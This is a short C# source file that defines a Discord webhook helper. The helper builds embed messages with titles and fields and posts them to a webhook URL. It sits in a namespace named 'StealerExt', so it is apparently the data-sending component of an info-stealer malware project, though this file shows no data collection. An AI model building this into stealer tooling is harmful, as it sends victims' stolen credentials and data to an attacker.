using System.Collections.Generic;
using System.Threading.Tasks;

namespace StealerExt
{
    internal class DiscordWebhook
    {
        private readonly string _url;
        private readonly List<object> DiscordEmbedFields = new List<object>();
        private readonly List<object> DiscordEmbeds = new List<object>();
        public DiscordWebhook(string Url)
        {
            _url = Url;
        }
        public void CreateEmbed(string Title, int Color)
        {
            DiscordEmbeds.Add(new
            {
                title = Title,
                color = Color,
                fields = DiscordEmbedFields
            });
        }
        public void AddField(string Name, string Value, bool Inline = false)
        {
            DiscordEmbedFields.Add(new
            {
                name = Name,
                value = Value,
                inline = Inline
            });
        }
        public async Task SendEmbed(string WebhookName = null, string WebhookAvatarUrl = null)
        {
            var newEmbed = new
            {
                username = WebhookName,
                avatar_url = WebhookAvatarUrl,
                embeds = DiscordEmbeds
            };
            await new HttpUtils().PostAsync(_url, newEmbed);
        }
    }
}